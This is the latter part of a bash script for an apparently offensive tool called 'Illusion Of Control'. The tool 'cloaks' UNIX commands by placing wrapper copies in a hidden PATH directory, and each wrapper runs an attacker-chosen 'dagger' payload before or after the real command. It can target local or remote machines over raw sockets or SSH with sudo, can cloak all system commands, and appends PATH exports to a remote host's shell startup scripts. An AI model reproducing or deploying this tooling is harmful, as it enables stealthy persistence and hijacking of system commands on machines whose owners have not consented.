            return 7
        fi
    fi

    echo "[ INFO ]: Creating remote command ($COMMAND) cloak in PATH directory"\
        "($PATH_DIR) from dagger file ($DAGGER_FILE_PATH)..."
    create_remote_command_cloak \
        "$COMMAND" "$DAGGER_FILE_PATH" "$PATH_DIR" "$CONNECTION_DETAILS"
    local EXIT_CODE=$?
    if [ $EXIT_CODE -ne 0 ] || [ -z "$EXIT_CODE" ]; then
        echo "[ ERROR ]: Could not create remote command ($COMMAND) cloak"\
            "using dagger file ($DAGGER_FILE_PATH), directory path ($PATH_DIR)"\
            "and connection details ($CONNECTION_DETAILS)."
    fi
    return $?
}

function init_command_cloak_and_dagger () {
    if [ ${#SHELL_COMMAND_PATHS[@]} -eq 0 ]; then
        COMMAND=( "$COMMAND_TO_CLOAK" )
    else
        COMMAND=( ${SHELL_COMMAND_PATHS[@]} )
    fi
    for cmd_path in ${COMMAND[@]}; do
        case "$TARGET" in
            'local')
                init_local_command_cloak_and_dagger \
                    "`basename $cmd_path`" \
                    "$DAGGER_FILE" \
                    "$PATH_DIRECTORY"
                local EXIT_CODE=$?
                ;;
            'remote')
                echo -n > $COUNT_FILE 2> /dev/null
                init_remote_command_cloak_and_dagger \
                    "$cmd_path" \
                    "$DAGGER_FILE" \
                    "$PATH_DIRECTORY" \
                    "$REMOTE"
                local EXIT_CODE=$?
                echo "[ INFO ]: Illusion Of Control session required"\
                    "(`cat $COUNT_FILE`) connections to target machine.
                "
                rm $COUNT_FILE &> /dev/null
                ;;
            *)
                echo "[ WARNING ]: Invalid target ($TARGET). Defaulting to local."
                init_local_command_cloak_and_dagger \
                    "`basename $cmd_path`" \
                    "$DAGGER_FILE" \
                    "$PATH_DIRECTORY"
                local EXIT_CODE=$?
                ;;
        esac
    done
    return $EXIT_CODE
}

function init_local_command_cloak_and_dagger () {
    local COMMAND="$1"
    local DAGGER_FILE_PATH="$2"
    local PATH_DIR="$3"

    check_command_exists "$COMMAND"
    if [ $? -ne 0 ]; then
        echo "[ ERROR ]: Command ($COMMAND) not recognized. Aborting action."
        return 5
    fi

    ensure_path_directory_exists "$PATH_DIR"
    if [ $? -ne 0 ]; then
        echo "[ ERROR ]: Could not ensure path directory ($PATH_DIR) exists."\
            "Aborting action."
        return 6
    fi

    if [ $SETUP_PATH -eq 1 ]; then
        ensure_path_directory_set "$PATH_DIR"
        if [ $? -ne 0 ]; then
            echo "[ ERROR ]: Could not ensure path directory ($PATH_DIR)"\
                "is set. Aborting action."
            return 7
        fi
    fi

    create_command_cloak "$COMMAND" "$DAGGER_FILE_PATH" "$PATH_DIR"
    return $?
}

# DISPLAY

function display_header () {
    echo "
    ___________________________________________________________________________

     *            *           * ${SCRIPT_NAME} *           *            *
    _____________________________________________________v${VERSION_NO}${VERSION}______
                Excellent Regards, the Alveare Solutions #!/Society -x
    "
}

function display_banner () {
    display_header
    if [ ${#SHELL_COMMAND_PATHS[@]} -eq 0 ]; then
        local COMMAND="$COMMAND_TO_CLOAK"
    else
        local COMMAND="all"
    fi
    echo "[ SETUP PATH ]: $SETUP_PATH
[ FORCE      ]: $FORCE_COMMAND
[ COMMAND    ]: $COMMAND
[ ORDER      ]: $CLOAK_ORDER
[ DAGGER     ]: $DAGGER_FILE
[ PATH       ]: $PATH_DIRECTORY
[ TARGET     ]: $TARGET
[ CONEX TYPE ]: $CONNECTION_TYPE
[ REMOTE     ]: $REMOTE
[ TMP FILE   ]: $TMP_FILE
[ TIMEOUT    ]: $TIMEOUT_SEC
[ SUDO       ]: $SUDO_FLAG
    "
}

function display_usage () {
    display_header
    cat <<EOF
    [ USAGE ]: $0 -<command>=<value>

    -h    | --help             Display this message.

    -c=   | --command=         UNIX command to cloak - default (env).

    -o=   | --order=           Order of dagger execution - default (pre-exec).

    -e=   | --execute=         Path to dagger file - default
          |                    ({path}/{command}.dagger).

    -p=   | --path=            Path to directory holding command cloaks -
          |                    default (/.uzr/bin).

    -t=   | --target=          Specify if target machine is remote or local -
          |                    default (local).

    -cnx= | --connection-type= Implies -t=remote. In case target is remote,
          |                    specifies the connection protocol - default (raw).

    -r=   | --remote=          Implies -t=remote. Specifies connection details
          |                    like address, port, user and password.

    -s    | --set-path         Implies -p. Sets the spcified directory holding
          |                    cloaks to execution path. Automatically cloaks
          |                    the env command.

    -f    | --force            Forces command by attempting to overcome errors
          |                    when encountered. One example would be creating
          |                    directories that have been specified but were
          |                    not found on the system.

    -a    | --all              Excludes -c, implies -e. Cloaks all system
          |                    commands with given dagger file.

    -tmp= | --temporary-file=  Implies -t=remote. Sets temporary file to hide
          |                    remote password into, prior to connecting.
          |                    Defaults to (/tmp/ioc-cli.tmp)

    -w=   | --wait=            Implies -t=remote. Sets the number of seconds to
          |                    wait until connection timeout.

    -S    | --sudo             Run commands (remotely or localy) using SUDO.

    [ EXAMPLE ]: $0
        (--help           |-h)
    - OR -
        (--command        |-c)=ls
        (--order          |-o)=pre-exec            # (pre-exec | post-exec)
        (--execute        |-e)=/path/to/ls.dagger
        (--path           |-p)=/.uzr/bin
        (--target         |-t)=local               # (local    | remote   )
        (--setup-path     |-s)
        (--force          |-f)
    - OR -
        (--command        |-c)=ls
        (--order          |-o)=pre-exec            # (pre-exec | post-exec)
        (--execute        |-e)=/path/to/ls.dagger
        (--path           |-p)=/.uzr/bin
        (--target         |-t)=remote              # (local    | remote   )
        (--connection-type|-cnx)=raw               # (raw      | ssh      )
        (--wait           |-w)=3
        (--remote         |-r)=@127.0.0.1:8080     # @address:port
    - OR -
        (--command        |-c)=ls
        (--order          |-o)=pre-exec            # (pre-exec | post-exec)
        (--execute        |-e)=/path/to/ls.dagger
        (--path           |-p)=/.uzr/bin
        (--temporary-file |-tmp)=/path/to/file.tmp
        (--target         |-t)=remote              # (local    | remote   )
        (--connection-type|-cnx)=ssh               # (raw      | ssh      )
        (--remote         |-r)=sucker@127.0.0.1:22:# user@address:port:password
        (--sudo           |-S)

EOF
}

# MISCELLANEOUS

if [ $# -eq 0 ]; then
    echo "[ ERROR ]: Invalid number of arguments ($#)."
    display_usage
    exit 1
fi

for opt in "$@"
do
    case "$opt" in
        -h|--help)
            display_usage
            exit 0
            ;;
        -s|--set-path)
            set_setup_path_flag 1
            echo "[ SETUP ]: Setup PATH flag ($?)."
            ;;
        -S|--sudo)
            set_sudo_flag 1
            echo "[ SETUP ]: Setup SUDO flag ($?)."
            ;;
        -f|--force)
            set_force_flag 1
            echo "[ SETUP ]: Force command flag ($?)."
            ;;
        -c=*|--command=*)
            set_command_to_cloak "${opt#*=}"
            echo "[ SETUP ]: Command to cloak ($?)."
            ;;
        -o=*|--order=*)
            set_cloak_order "${opt#*=}"
            echo "[ SETUP ]: Cloak execution order ($?)."
            ;;
        -e=*|--execute=*)
            set_dagger_file_path "${opt#*=}"
            echo "[ SETUP ]: Dagger file path ($?)."
            ;;
        -p=*|--path=*)
            set_cloak_directory_path "${opt#*=}"
            echo "[ SETUP ]: Cloak directory path ($?)."
            ;;
        -t=*|--target=*)
            set_target "${opt#*=}"
            echo "[ SETUP ]: Target ($?)."
            ;;
        -cnx=*|--connection-type=*)
            set_remote_connection_type "${opt#*=}"
            echo "[ SETUP ]: Remote connection type ($?)."
            ;;
        -r=*|--remote=*)
            set_remote_connection_details "${opt#*=}"
            echo "[ SETUP ]: Remote connection details ($?)."
            ;;
        -a|--all)
            discover_all_shell_command_paths
            echo "[ SETUP ]: Discovering all shell commands ($?)."
            ;;
        -tmp=*|--temporary-file=*)
            set_temporary_file_path "${opt#*=}"
            echo "[ SETUP ]: Temporary file path ($?)."
            ;;
        -w=*|--wait=*)
            set_seconds_until_timeout ${opt#*=}
            echo "[ SETUP ]: Number of seconds until timeout ($?)."
            ;;
    esac
done
clear

display_banner
init_command_cloak_and_dagger

exit $?

# CODE DUMP

#   function format_ensure_remote_path_directory_set_instruction () {
#       local DIR_PATH="$1"
#       local CONNECTION_DETAILS="$2"
#       REMOTE_STARTUP_SCRIPTS=( `fetch_all_remote_bash_startup_scripts "$CONNECTION_DETAILS"` )
#       echo "echo \$PATH | grep $DIR_PATH &> /dev/null ||"\
#           "for script_path in ${REMOTE_STARTUP_SCRIPTS[@]}; do"\
#           "echo 'export PATH=$NEW_PATH' >> \$script_path; done; echo "'$?'
#       return $?
#   }


